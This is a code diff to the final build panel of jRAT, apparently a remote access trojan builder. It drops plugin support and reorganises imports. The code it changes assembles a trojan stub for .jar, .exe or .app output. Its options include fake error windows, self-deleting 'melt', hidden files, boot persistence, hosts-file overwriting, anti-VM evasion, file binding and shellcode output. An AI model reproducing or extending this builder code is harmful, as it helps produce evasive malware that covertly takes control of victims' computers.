@@ -6,37 +6,25 @@ import jrat.controller.ErrorDialog;
 import jrat.controller.Globals;
 import jrat.controller.OSConfig;
 import jrat.controller.ShellcodeGenerator;
-import jrat.controller.addons.PluginList;
-import jrat.controller.addons.StubPlugin;
 import jrat.controller.build.Build;
 import jrat.controller.build.BuildApp;
 import jrat.controller.build.BuildExecutable;
 import jrat.controller.build.BuildStatus;
 import jrat.controller.listeners.AdvancedBuildListener;
 import jrat.controller.settings.Settings;
+import jrat.controller.ui.DefaultJTable;
 import jrat.controller.ui.components.TableModel;
 import jrat.controller.ui.frames.FrameBuildAdvanced;
 import jrat.controller.ui.renderers.table.BuildTableRenderer;
+
+import javax.swing.*;
+import javax.swing.GroupLayout.Alignment;
+import javax.swing.LayoutStyle.ComponentPlacement;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
 import java.io.File;
 import java.io.IOException;
 import java.util.LinkedHashMap;
-import javax.swing.BorderFactory;
-import javax.swing.GroupLayout;
-import javax.swing.GroupLayout.Alignment;
-import javax.swing.JButton;
-import javax.swing.JFileChooser;
-import javax.swing.JLabel;
-import javax.swing.JPanel;
-import javax.swing.JProgressBar;
-import javax.swing.JScrollPane;
-import javax.swing.JTable;
-import javax.swing.JTextField;
-import javax.swing.LayoutStyle.ComponentPlacement;
-import javax.swing.ScrollPaneConstants;
-import jrat.api.ui.DefaultJTable;
-
 
 @SuppressWarnings("serial")
 public class PanelBuildFinal extends JPanel {
@@ -167,7 +155,6 @@ public class PanelBuildFinal extends JPanel {
 					PanelBuildStartup startup = (PanelBuildStartup) holder.panels.get("startup");
 					PanelBuildMutex mutex = (PanelBuildMutex) holder.panels.get("mutex");
 					PanelBuildOS os = (PanelBuildOS) holder.panels.get("allowed os");
-					PanelBuildPlugins pl = (PanelBuildPlugins) holder.panels.get("plugins");
 					PanelBuildTimeout ti = (PanelBuildTimeout) holder.panels.get("timeout");
 					PanelBuildDelay de = (PanelBuildDelay) holder.panels.get("delay");
 					PanelBuildHostFile host = (PanelBuildHostFile) holder.panels.get("host file");
@@ -199,7 +186,6 @@ public class PanelBuildFinal extends JPanel {
 					int binddrop = binder.dropTarget();
 					boolean usemutex = mutex.useMutex();
 					int mutexport = mutex.mutexPort();
-					PluginList plist = pl.getList();
 					boolean timeout = ti.enabled();
 					int timeoutms = ti.getSecondsAsMilli();
 					boolean delay = de.useDelay();
@@ -225,7 +211,7 @@ public class PanelBuildFinal extends JPanel {
 
 					if (out.useShellcode()) {
 						File temp = File.createTempFile("jratbuild", ".jar");
-						Build.build(new AdvancedBuildListener(frame), Globals.getStub(), temp, addresses, ID, pass, dontInstall, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, runNextBoot, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, plist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true, antivm);
+						Build.build(new AdvancedBuildListener(frame), Globals.getStub(), temp, addresses, ID, pass, dontInstall, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, runNextBoot, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true, antivm);
 
 						if (!file.endsWith(".jar")) {
 							file = file + ".jar";
@@ -236,7 +222,7 @@ public class PanelBuildFinal extends JPanel {
 					} else if (out.useExe()) {
 						File temp = File.createTempFile("jratbuild", ".jar");
 
-						Build.build(new AdvancedBuildListener(frame), Globals.getStub(), temp, addresses, ID, pass, dontInstall, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, runNextBoot, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, plist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true, antivm);
+						Build.build(new AdvancedBuildListener(frame), Globals.getStub(), temp, addresses, ID, pass, dontInstall, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, runNextBoot, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true, antivm);
 
 						if (!file.toLowerCase().endsWith(".exe")) {
 							file = file + ".exe";
@@ -248,7 +234,7 @@ public class PanelBuildFinal extends JPanel {
 					} else if (out.useApp()) {
 						File temp = File.createTempFile("jratbuild", ".jar");
 
-						Build.build(new AdvancedBuildListener(frame), Globals.getStub(), temp, addresses, ID, pass, dontInstall, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, runNextBoot, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, plist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true, antivm);
+						Build.build(new AdvancedBuildListener(frame), Globals.getStub(), temp, addresses, ID, pass, dontInstall, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, runNextBoot, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true, antivm);
 
 						if (!file.toLowerCase().endsWith(".app")) {
 							file = file + ".app";
@@ -258,7 +244,7 @@ public class PanelBuildFinal extends JPanel {
 
 						temp.delete();
 					} else {				
-						Build.build(new AdvancedBuildListener(frame), Globals.getStub(), new File(file), addresses, ID, pass, dontInstall, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, runNextBoot, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, plist, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true, antivm);		
+						Build.build(new AdvancedBuildListener(frame), Globals.getStub(), new File(file), addresses, ID, pass, dontInstall, droppath, reconSec, name, fakewindow, faketitle, fakemessage, fakeicon, melt, runNextBoot, hiddenFile, bind, bindpath, bindname, binddrop, usemutex, mutexport, timeout, timeoutms, delay, delayms, usehost, hosttext, overwritehost, trayicon, icon, traymsg, traymsgfail, traytitle, handleerr, persistance, persistancems, debugmsg, osconfig, true, antivm);
 					}
 
 					Settings.getGlobal().set(Settings.KEY_HOSTS, network.getAddresses());
@@ -278,7 +264,6 @@ public class PanelBuildFinal extends JPanel {
 
 	public void formatLbl() {
 		PanelBuildBinder binder = (PanelBuildBinder) holder.panels.get("binder");
-		PanelBuildPlugins plugins = (PanelBuildPlugins) holder.panels.get("plugins");
 
 		int size = (int) Globals.getStub().length();
 
@@ -286,13 +271,6 @@ public class PanelBuildFinal extends JPanel {
 			File bind = new File(binder.getFile());
 			if (bind.exists()) {
 				size += bind.length();
-			}
-		}
-
-		PluginList list = plugins.getList();
-		if (list != null) {
-			for (StubPlugin p : list.plugins) {
-				size += new File(p.path).length();
 			}
 		}
 
